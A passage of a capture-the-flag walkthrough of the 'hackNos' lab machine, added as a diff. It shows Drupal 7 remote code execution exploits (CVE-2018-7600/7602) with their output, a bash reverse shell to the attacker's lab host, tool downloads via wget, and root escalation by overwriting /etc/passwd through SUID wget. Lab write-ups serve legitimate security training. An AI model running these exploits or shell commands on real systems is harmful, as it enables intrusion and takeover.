+<span id="cb18-67"><a href="#cb18-67" aria-hidden="true"></a>Disallow: /MAINTAINERS.txt</span>
+<span id="cb18-68"><a href="#cb18-68" aria-hidden="true"></a>Disallow: /update.php</span>
+<span id="cb18-69"><a href="#cb18-69" aria-hidden="true"></a>Disallow: /UPGRADE.txt</span>
+<span id="cb18-70"><a href="#cb18-70" aria-hidden="true"></a>Disallow: /xmlrpc.php</span>
+<span id="cb18-71"><a href="#cb18-71" aria-hidden="true"></a># Paths (clean URLs)</span>
+<span id="cb18-72"><a href="#cb18-72" aria-hidden="true"></a>Disallow: /admin/</span>
+<span id="cb18-73"><a href="#cb18-73" aria-hidden="true"></a>Disallow: /comment/reply/</span>
+<span id="cb18-74"><a href="#cb18-74" aria-hidden="true"></a>Disallow: /filter/tips/</span>
+<span id="cb18-75"><a href="#cb18-75" aria-hidden="true"></a>Disallow: /node/add/</span>
+<span id="cb18-76"><a href="#cb18-76" aria-hidden="true"></a>Disallow: /search/</span>
+<span id="cb18-77"><a href="#cb18-77" aria-hidden="true"></a>Disallow: /user/register/</span>
+<span id="cb18-78"><a href="#cb18-78" aria-hidden="true"></a>Disallow: /user/password/</span>
+<span id="cb18-79"><a href="#cb18-79" aria-hidden="true"></a>Disallow: /user/login/</span>
+<span id="cb18-80"><a href="#cb18-80" aria-hidden="true"></a>Disallow: /user/logout/</span>
+<span id="cb18-81"><a href="#cb18-81" aria-hidden="true"></a># Paths (no clean URLs)</span>
+<span id="cb18-82"><a href="#cb18-82" aria-hidden="true"></a>Disallow: /?q=admin/</span>
+<span id="cb18-83"><a href="#cb18-83" aria-hidden="true"></a>Disallow: /?q=comment/reply/</span>
+<span id="cb18-84"><a href="#cb18-84" aria-hidden="true"></a>Disallow: /?q=filter/tips/</span>
+<span id="cb18-85"><a href="#cb18-85" aria-hidden="true"></a>Disallow: /?q=node/add/</span>
+<span id="cb18-86"><a href="#cb18-86" aria-hidden="true"></a>Disallow: /?q=search/</span>
+<span id="cb18-87"><a href="#cb18-87" aria-hidden="true"></a>Disallow: /?q=user/password/</span>
+<span id="cb18-88"><a href="#cb18-88" aria-hidden="true"></a>Disallow: /?q=user/register/</span>
+<span id="cb18-89"><a href="#cb18-89" aria-hidden="true"></a>Disallow: /?q=user/login/</span>
+<span id="cb18-90"><a href="#cb18-90" aria-hidden="true"></a>Disallow: /?q=user/logout/</span></code></pre></div>
+<h3 id="drupalweb.config">/drupal/web.config</h3>
+<div class="sourceCode" id="cb19"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true"></a><span class="kw">&lt;?xml</span> version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;<span class="kw">?&gt;</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true"></a><span class="kw">&lt;configuration&gt;</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true"></a>  <span class="kw">&lt;system.webServer&gt;</span></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true"></a>    <span class="co">&lt;!-- Don&#39;t show directory listings for URLs which map to a directory. --&gt;</span></span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true"></a>    <span class="kw">&lt;directoryBrowse</span><span class="ot"> enabled=</span><span class="st">&quot;false&quot;</span> <span class="kw">/&gt;</span></span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true"></a>    <span class="kw">&lt;rewrite&gt;</span></span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true"></a>      <span class="kw">&lt;rules&gt;</span></span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true"></a>        <span class="kw">&lt;rule</span><span class="ot"> name=</span><span class="st">&quot;Protect files and directories from prying eyes&quot;</span><span class="ot"> stopProcessing=</span><span class="st">&quot;true&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true"></a>          <span class="kw">&lt;match</span><span class="ot"> url=</span><span class="st">&quot;\.(engine|inc|info|install|make|module|profile|test|po|sh|.*sql|theme|tpl(\.php)?|xtmpl)$|^(\..*|Entries.*|Repository|Root|Tag|Template|composer\.(json|lock))$&quot;</span> <span class="kw">/&gt;</span></span>
+<span id="cb19-10"><a href="#cb19-10" aria-hidden="true"></a>          <span class="kw">&lt;action</span><span class="ot"> type=</span><span class="st">&quot;CustomResponse&quot;</span><span class="ot"> statusCode=</span><span class="st">&quot;403&quot;</span><span class="ot"> subStatusCode=</span><span class="st">&quot;0&quot;</span><span class="ot"> statusReason=</span><span class="st">&quot;Forbidden&quot;</span><span class="ot"> statusDescription=</span><span class="st">&quot;Access is forbidden.&quot;</span> <span class="kw">/&gt;</span></span>
+<span id="cb19-11"><a href="#cb19-11" aria-hidden="true"></a>        <span class="kw">&lt;/rule&gt;</span></span>
+<span id="cb19-12"><a href="#cb19-12" aria-hidden="true"></a>        <span class="kw">&lt;rule</span><span class="ot"> name=</span><span class="st">&quot;Force simple error message for requests for non-existent favicon.ico&quot;</span><span class="ot"> stopProcessing=</span><span class="st">&quot;true&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-13"><a href="#cb19-13" aria-hidden="true"></a>          <span class="kw">&lt;match</span><span class="ot"> url=</span><span class="st">&quot;favicon\.ico&quot;</span> <span class="kw">/&gt;</span></span>
+<span id="cb19-14"><a href="#cb19-14" aria-hidden="true"></a>          <span class="kw">&lt;action</span><span class="ot"> type=</span><span class="st">&quot;CustomResponse&quot;</span><span class="ot"> statusCode=</span><span class="st">&quot;404&quot;</span><span class="ot"> subStatusCode=</span><span class="st">&quot;1&quot;</span><span class="ot"> statusReason=</span><span class="st">&quot;File Not Found&quot;</span><span class="ot"> statusDescription=</span><span class="st">&quot;The requested file favicon.ico was not found&quot;</span> <span class="kw">/&gt;</span></span>
+<span id="cb19-15"><a href="#cb19-15" aria-hidden="true"></a>          <span class="kw">&lt;conditions&gt;</span></span>
+<span id="cb19-16"><a href="#cb19-16" aria-hidden="true"></a>            <span class="kw">&lt;add</span><span class="ot"> input=</span><span class="st">&quot;{REQUEST_FILENAME}&quot;</span><span class="ot"> matchType=</span><span class="st">&quot;IsFile&quot;</span><span class="ot"> negate=</span><span class="st">&quot;true&quot;</span> <span class="kw">/&gt;</span></span>
+<span id="cb19-17"><a href="#cb19-17" aria-hidden="true"></a>          <span class="kw">&lt;/conditions&gt;</span></span>
+<span id="cb19-18"><a href="#cb19-18" aria-hidden="true"></a>        <span class="kw">&lt;/rule&gt;</span></span>
+<span id="cb19-19"><a href="#cb19-19" aria-hidden="true"></a>        <span class="co">&lt;!-- Rewrite URLs of the form &#39;x&#39; to the form &#39;index.php?q=x&#39;. --&gt;</span></span>
+<span id="cb19-20"><a href="#cb19-20" aria-hidden="true"></a>        <span class="kw">&lt;rule</span><span class="ot"> name=</span><span class="st">&quot;Short URLs&quot;</span><span class="ot"> stopProcessing=</span><span class="st">&quot;true&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb19-21"><a href="#cb19-21" aria-hidden="true"></a>          <span class="kw">&lt;match</span><span class="ot"> url=</span><span class="st">&quot;^(.*)$&quot;</span><span class="ot"> ignoreCase=</span><span class="st">&quot;false&quot;</span> <span class="kw">/&gt;</span></span>
+<span id="cb19-22"><a href="#cb19-22" aria-hidden="true"></a>          <span class="kw">&lt;conditions&gt;</span></span>
+<span id="cb19-23"><a href="#cb19-23" aria-hidden="true"></a>            <span class="kw">&lt;add</span><span class="ot"> input=</span><span class="st">&quot;{REQUEST_FILENAME}&quot;</span><span class="ot"> matchType=</span><span class="st">&quot;IsFile&quot;</span><span class="ot"> ignoreCase=</span><span class="st">&quot;false&quot;</span><span class="ot"> negate=</span><span class="st">&quot;true&quot;</span> <span class="kw">/&gt;</span></span>
+<span id="cb19-24"><a href="#cb19-24" aria-hidden="true"></a>            <span class="kw">&lt;add</span><span class="ot"> input=</span><span class="st">&quot;{REQUEST_FILENAME}&quot;</span><span class="ot"> matchType=</span><span class="st">&quot;IsDirectory&quot;</span><span class="ot"> ignoreCase=</span><span class="st">&quot;false&quot;</span><span class="ot"> negate=</span><span class="st">&quot;true&quot;</span> <span class="kw">/&gt;</span></span>
+<span id="cb19-25"><a href="#cb19-25" aria-hidden="true"></a>            <span class="kw">&lt;add</span><span class="ot"> input=</span><span class="st">&quot;{URL}&quot;</span><span class="ot"> pattern=</span><span class="st">&quot;^/favicon.ico$&quot;</span><span class="ot"> ignoreCase=</span><span class="st">&quot;false&quot;</span><span class="ot"> negate=</span><span class="st">&quot;true&quot;</span> <span class="kw">/&gt;</span></span>
+<span id="cb19-26"><a href="#cb19-26" aria-hidden="true"></a>          <span class="kw">&lt;/conditions&gt;</span></span>
+<span id="cb19-27"><a href="#cb19-27" aria-hidden="true"></a>          <span class="kw">&lt;action</span><span class="ot"> type=</span><span class="st">&quot;Rewrite&quot;</span><span class="ot"> url=</span><span class="st">&quot;index.php?q={R:1}&quot;</span><span class="ot"> appendQueryString=</span><span class="st">&quot;true&quot;</span> <span class="kw">/&gt;</span></span>
+<span id="cb19-28"><a href="#cb19-28" aria-hidden="true"></a>        <span class="kw">&lt;/rule&gt;</span></span>
+<span id="cb19-29"><a href="#cb19-29" aria-hidden="true"></a>      <span class="kw">&lt;/rules&gt;</span></span>
+<span id="cb19-30"><a href="#cb19-30" aria-hidden="true"></a>    <span class="kw">&lt;/rewrite&gt;</span></span>
+<span id="cb19-31"><a href="#cb19-31" aria-hidden="true"></a></span>
+<span id="cb19-32"><a href="#cb19-32" aria-hidden="true"></a>    <span class="kw">&lt;httpErrors&gt;</span></span>
+<span id="cb19-33"><a href="#cb19-33" aria-hidden="true"></a>      <span class="kw">&lt;remove</span><span class="ot"> statusCode=</span><span class="st">&quot;404&quot;</span><span class="ot"> subStatusCode=</span><span class="st">&quot;-1&quot;</span> <span class="kw">/&gt;</span></span>
+<span id="cb19-34"><a href="#cb19-34" aria-hidden="true"></a>      <span class="kw">&lt;error</span><span class="ot"> statusCode=</span><span class="st">&quot;404&quot;</span><span class="ot"> prefixLanguageFilePath=</span><span class="st">&quot;&quot;</span><span class="ot"> path=</span><span class="st">&quot;/index.php&quot;</span><span class="ot"> responseMode=</span><span class="st">&quot;ExecuteURL&quot;</span> <span class="kw">/&gt;</span></span>
+<span id="cb19-35"><a href="#cb19-35" aria-hidden="true"></a>    <span class="kw">&lt;/httpErrors&gt;</span></span>
+<span id="cb19-36"><a href="#cb19-36" aria-hidden="true"></a></span>
+<span id="cb19-37"><a href="#cb19-37" aria-hidden="true"></a>    <span class="kw">&lt;defaultDocument&gt;</span></span>
+<span id="cb19-38"><a href="#cb19-38" aria-hidden="true"></a>      <span class="co">&lt;!-- Set the default document --&gt;</span></span>
+<span id="cb19-39"><a href="#cb19-39" aria-hidden="true"></a>      <span class="kw">&lt;files&gt;</span></span>
+<span id="cb19-40"><a href="#cb19-40" aria-hidden="true"></a>        <span class="kw">&lt;remove</span><span class="ot"> value=</span><span class="st">&quot;index.php&quot;</span> <span class="kw">/&gt;</span></span>
+<span id="cb19-41"><a href="#cb19-41" aria-hidden="true"></a>        <span class="kw">&lt;add</span><span class="ot"> value=</span><span class="st">&quot;index.php&quot;</span> <span class="kw">/&gt;</span></span>
+<span id="cb19-42"><a href="#cb19-42" aria-hidden="true"></a>      <span class="kw">&lt;/files&gt;</span></span>
+<span id="cb19-43"><a href="#cb19-43" aria-hidden="true"></a>    <span class="kw">&lt;/defaultDocument&gt;</span></span>
+<span id="cb19-44"><a href="#cb19-44" aria-hidden="true"></a>  <span class="kw">&lt;/system.webServer&gt;</span></span>
+<span id="cb19-45"><a href="#cb19-45" aria-hidden="true"></a><span class="kw">&lt;/configuration&gt;</span></span>
+<span id="cb19-46"><a href="#cb19-46" aria-hidden="true"></a></span></code></pre></div>
+<h3 id="drupaupdate.php">/drupa/update.php</h3>
+<figure>
+<img src="13.drupal-update-php.png" alt="" /><figcaption>13.drupal-update-php</figcaption>
+</figure>
+<h3 id="drupalinstall.php">/drupal/install.php</h3>
+<figure>
+<img src="14.drupal-install-php.png" alt="" /><figcaption>14.drupal-install-php</figcaption>
+</figure>
+<h2 id="attacking-web-login">Attacking web login</h2>
+<p>admin:admin</p>
+<figure>
+<img src="15.login-error.png" alt="" /><figcaption>15.login-error</figcaption>
+</figure>
+<p>Then I remembered robots.txt and found ?q=admin</p>
+<pre class="shell"><code>python3 ./drupa7-CVE-2018-7600.py http://192.168.56.87/drupal/?q=admin -c &quot;id &amp;&amp; whoami &amp;&amp; hostname &amp;&amp; date&quot;
+
+=============================================================================
+|          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
+|                              by pimps                                     |
+=============================================================================
+
+[*] Poisoning a form and including it in cache.
+[*] Poisoned form ID: form-o7wadKXF6-k8I0Z9mGYkVg3tlPdvhOlVuy8jPIc5qQo
+[*] Triggering exploit to execute: id &amp;&amp; whoami &amp;&amp; hostname &amp;&amp; date
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data
+hackNos
+Mon Jan  3 10:15:54 IST 2022
+</code></pre>
+<p><a href="https://github.com/f0c1s/CVE-2018-7600">source code</a></p>
+<p>It is forked to my repo, so that I can go back to the instance it was working.</p>
+<p>The origin repo might get updated, in future, or get deleted or whatever.</p>
+<p>Oh well, this was easy.</p>
+<h2 id="reverse-shell">Reverse shell</h2>
+<h3 id="listen-for-connection">Listen for connection</h3>
+<pre class="shell"><code>sudo nc -nlvp $LPORT -s $LHOST
+Listening on 192.168.56.70 443</code></pre>
+<h3 id="trigger">Trigger</h3>
+<pre class="shell"><code>python3 ./drupa7-CVE-2018-7600.py http://192.168.56.87/drupal/?q=admin -c &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.70/443 0&gt;&amp;1&#39;&quot;
+
+=============================================================================
+|          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
+|                              by pimps                                     |
+=============================================================================
+
+[*] Poisoning a form and including it in cache.
+[*] Poisoned form ID: form--VUF3nWmaDttipsWbtBHsASodEvEDvAE4RZJaYJaPKw
+[*] Triggering exploit to execute: bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.70/443 0&gt;&amp;1&#39;
+... stuck here ...</code></pre>
+<h3 id="caught">Caught</h3>
+<pre class="shell"><code>sudo nc -nlvp $LPORT -s $LHOST
+Listening on 192.168.56.70 443
+Connection received on 192.168.56.87 43516
+bash: cannot set terminal process group (1145): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@hackNos:/var/www/html/drupal$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@hackNos:/var/www/html/drupal$ whoami
+whoami
+www-data
+www-data@hackNos:/var/www/html/drupal$ hostname
+hostname
+hackNos
+www-data@hackNos:/var/www/html/drupal$ date
+date
+Mon Jan  3 10:18:35 IST 2022
+www-data@hackNos:/var/www/html/drupal$</code></pre>
+<figure>
+<img src="16.caught-a-reverse-shell.png" alt="" /><figcaption>16.caught-a-reverse-shell</figcaption>
+</figure>
+<h3 id="etcpasswd">/etc/passwd</h3>
+<pre><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+james:x:1000:1000:james,,,:/home/james:/bin/bash
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false</code></pre>
+<h3 id="flag-homejamesuser.txt">flag /home/james/user.txt</h3>
+<pre class="shell"><code>www-data@hackNos:/home/james$ cat user.txt
+cat user.txt
+   _
+  | |
+ / __) ______  _   _  ___   ___  _ __
+ \__ \|______|| | | |/ __| / _ \| &#39;__|
+ (   /        | |_| |\__ \|  __/| |
+  |_|          \__,_||___/ \___||_|
+
+
+
+MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
+</code></pre>
+<h3 id="is-mysql-running">is mysql running</h3>
+<pre class="shell"><code>www-data@hackNos:/home/james$ ps -ef | grep -i mysql
+ps -ef | grep -i mysql
+mysql      990     1  0 08:45 ?        00:00:05 /usr/sbin/mysqld
+www-data  2024  2000  0 10:22 ?        00:00:00 grep -i mysql</code></pre>
+<p>Yes it is.</p>
+<h3 id="varwwwhtml-has-secrets">/var/www/html has secrets</h3>
+<pre class="shell"><code>www-data@hackNos:/var/www/html$ ls -la
+ls -la
+total 28
+drwxr-xr-x 3 root     root      4096 Oct 31  2019 .
+drwxr-xr-x 3 root     root      4096 Oct 31  2019 ..
+-rw-r--r-- 1 root     root       393 Oct 31  2019 alexander.txt
+drwxrwxrwx 9 www-data www-data  4096 Feb 21  2018 drupal
+-rw-r--r-- 1 root     root     11321 Oct 31  2019 index.html
+www-data@hackNos:/var/www/html$ cat alexander.txt
+cat alexander.txt
+KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==
+www-data@hackNos:/var/www/html$ cat alexander.txt | base64 -d
+cat alexander.txt | base64 -d
++++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ ++.-- ----- --.&lt;+ ++[-&gt; +++&lt;] &gt;+++.
+----- ---.&lt; +++[- &gt;+++&lt; ]&gt;+++ ++.&lt;+ +++++ +[-&gt;- ----- -&lt;]&gt;- ----- --.&lt;+
+++[-&gt; +++&lt;] &gt;++++ +.&lt;++ +++[- &gt;++++ +&lt;]&gt;. ++.++ +++++ +.--- ---.&lt; +++[-
+&gt;+++&lt; ]&gt;+++ +.&lt;++ +++++ [-&gt;-- ----- &lt;]&gt;-. &lt;+++[ -&gt;--- &lt;]&gt;-- -.+.- ---.+</code></pre>
+<figure>
+<img src="17.credentials.png" alt="" /><figcaption>17.credentials</figcaption>
+</figure>
+<p>Credentials: <code>james:Hacker@451</code></p>
+<p>Credentials: <code>james:Hacker@4514</code></p>
+<h2 id="ssh">SSH</h2>
+<p>The credentials above didn’t work.</p>
+<p>I looked back and found that I had dropped <code>++.</code> from the source code.</p>
+<figure>
+<img src="18.credentials.png" alt="" /><figcaption>18.credentials</figcaption>
+</figure>
+<p>Anyway, cannot ssh.</p>
+<h2 id="becoming-user-james">Becoming user james</h2>
+<pre class="shell"><code>sudo nc -nlvp $LPORT -s $LHOST
+Listening on 192.168.56.70 443
+Connection received on 192.168.56.87 43518
+bash: cannot set terminal process group (1145): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@hackNos:/var/www/html/drupal$ su james
+su james
+su: must be run from a terminal
+www-data@hackNos:/var/www/html/drupal$ which python
+which python
+www-data@hackNos:/var/www/html/drupal$ which python3
+which python3
+/usr/bin/python3
+www-data@hackNos:/var/www/html/drupal$ python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+&lt;tml/drupal$ python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+www-data@hackNos:/var/www/html/drupal$
+
+www-data@hackNos:/var/www/html/drupal$ su james
+su james
+Password: Hacker@4514
+
+su: Authentication failure
+www-data@hackNos:/var/www/html/drupal$ ^C
+</code></pre>
+<p>Well, this also fails. What are these credentials for.</p>
+<p>Lightbulb: drupal site.</p>
+<h2 id="drupal">/drupal</h2>
+<figure>
+<img src="19.logged-in-to-drupal.png" alt="" /><figcaption>19.logged-in-to-drupal</figcaption>
+</figure>
+<p>I couldn’t get the PHP reverse shell to work.</p>
+<p>Then I remembered part two of the attack that gave me reverse shell.</p>
+<h2 id="authenticated-rce">Authenticated RCE</h2>
+<pre class="shell"><code>python3 ./drupa7-CVE-2018-7602.py &quot;james&quot; &quot;Hacker@4514&quot; http://192.168.56.87/drupal/?q=admin
+
+===================================================================================
+|   DRUPAL 7 &lt;= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602)     |
+|                                   by pimps                                      |
+===================================================================================
+
+[*] Creating a session using the provided credential...
+[*] Finding User ID...
+[*] User ID found: user/1
+[*] Poisoning a form using &#39;destination&#39; and including it in cache.
+[*] Poisoned form ID: form-GO0YW5HoX6sWDybqoGaYOKnuLJNdQcAFIbgFqEQ0-R4
+[*] Triggering exploit to execute: id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>Well, WTF is the point.</p>
+<h2 id="cannot-write-to-files">Cannot write to files</h2>
+<pre class="shell"><code>www-data@hackNos:/tmp$ wget -q 192.168.56.70/{lse,LinEnum,linpeas}.sh
+wget -q 192.168.56.70/{lse,LinEnum,linpeas}.sh
+www-data@hackNos:/tmp$ chmod +x *.sh
+chmod +x *.sh
+chmod: changing permissions of &#39;LinEnum.sh&#39;: Operation not permitted
+chmod: changing permissions of &#39;linpeas.sh&#39;: Operation not permitted
+chmod: changing permissions of &#39;lse.sh&#39;: Operation not permitted
+www-data@hackNos:/tmp$ ls -la
+ls -la
+total 592
+drwxrwxrwt  8 root     root       4096 Jan  3 11:16 .
+drwxr-xr-x 22 root     root       4096 Oct 31  2019 ..
+drwxrwxrwt  2 root     root       4096 Jan  3 08:45 .ICE-unix
+drwxrwxrwt  2 root     root       4096 Jan  3 08:45 .Test-unix
+drwxrwxrwt  2 root     root       4096 Jan  3 08:45 .X11-unix
+drwxrwxrwt  2 root     root       4096 Jan  3 08:45 .XIM-unix
+drwxrwxrwt  2 root     root       4096 Jan  3 08:45 .font-unix
+-r--r--r--  1 www-data www-data    675 Jan  3 10:33 .htaccess
+-rw-r--r--  1 root     www-data  46631 Sep 24 08:22 LinEnum.sh
+-rw-r--r--  1 root     www-data 473222 Sep 24 09:08 linpeas.sh
+-rw-r--r--  1 root     www-data  43570 Sep 24 08:21 lse.sh
+drwx------  3 root     root       4096 Jan  3 08:45 systemd-private-e1480f7b9b6449b7b87620c4bfb94b2f-systemd-timesyncd.service-FxZFPA
+</code></pre>
+<h2 id="priv-esc">Priv Esc</h2>
+<h3 id="suid-binaries">SUID binaries</h3>
+<pre class="shell"><code>www-data@hackNos:/var/www/html$ find / -perm -4000 2&gt;/dev/null
+find / -perm -4000 2&gt;/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/pkexec
+/usr/bin/at
+/usr/bin/newgidmap
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/newuidmap
+/usr/bin/wget
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/chfn
+/bin/ping6
+/bin/umount
+/bin/ntfs-3g
+/bin/mount
+/bin/ping
+/bin/su
+/bin/fusermount</code></pre>
+<h3 id="sgid-binaries">SGID binaries</h3>
+<p>None.</p>
+<h3 id="systeminfo">systeminfo</h3>
+<pre class="shell"><code>www-data@hackNos:/var/www/html$ uname -a
+uname -a
+Linux hackNos 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU/Linux
+www-data@hackNos:/var/www/html$ cat /etc/*-release
+cat /etc/*-release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION=&quot;Ubuntu 16.04.6 LTS&quot;
+NAME=&quot;Ubuntu&quot;
+VERSION=&quot;16.04.6 LTS (Xenial Xerus)&quot;
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME=&quot;Ubuntu 16.04.6 LTS&quot;
+VERSION_ID=&quot;16.04&quot;
+HOME_URL=&quot;http://www.ubuntu.com/&quot;
+SUPPORT_URL=&quot;http://help.ubuntu.com/&quot;
+BUG_REPORT_URL=&quot;http://bugs.launchpad.net/ubuntu/&quot;
+VERSION_CODENAME=xenial
+UBUNTU_CODENAME=xenial</code></pre>
+<h3 id="etc-files">/etc files</h3>
+<pre class="shell"><code>www-data@hackNos:/var/www/html$ ls -la /etc/{passwd,passwd-,shadow,shadow-,group}
+&lt;tml$ ls -la /etc/{passwd,passwd-,shadow,shadow-,group}
+-rw-r--r-- 1 root root    811 Oct 31  2019 /etc/group
+-rw-r--r-- 1 root root   1620 Oct 31  2019 /etc/passwd
+-rw------- 1 root root   1605 Oct 31  2019 /etc/passwd-
+-rw-r----- 1 root shadow 1067 Nov 16  2019 /etc/shadow
+-rw------- 1 root root    970 Oct 31  2019 /etc/shadow-</code></pre>
+<h2 id="abusing-wget-being-in-suid-binary-list">Abusing wget being in SUID binary list</h2>
+<pre class="shell"><code>www-data@hackNos:/etc$ echo &#39;salty:$6$salty$TwLZ.kG/oqyEnXrhYGO8tQPAaX8GVJE5mhKgLSy9yKz7cNjaVNx3.7FtBVn4VEe.daS/nqBRwyEPpOr.jf228.:0:0:root:/:/bin/bash&#39; &gt;&gt; /etc/passwd
+&lt;Ee.daS/nqBRwyEPpOr.jf228.:0:0:root:/:/bin/bash&#39; &gt;&gt; /etc/passwd
+bash: /etc/passwd: Permission denied
+
+# since wget can run as root, this will work
+www-data@hackNos:/etc$ wget -q 192.168.56.70/etc-passwd.txt -O passwd
+wget -q 192.168.56.70/etc-passwd.txt -O passwd
+</code></pre>
+<pre class="shell"><code>python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.56.87 - - [03/Jan/2022 11:36:41] &quot;GET /etc-passwd.txt HTTP/1.1&quot; 200 -</code></pre>
+<pre class="shell"><code>www-data@hackNos:/etc$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
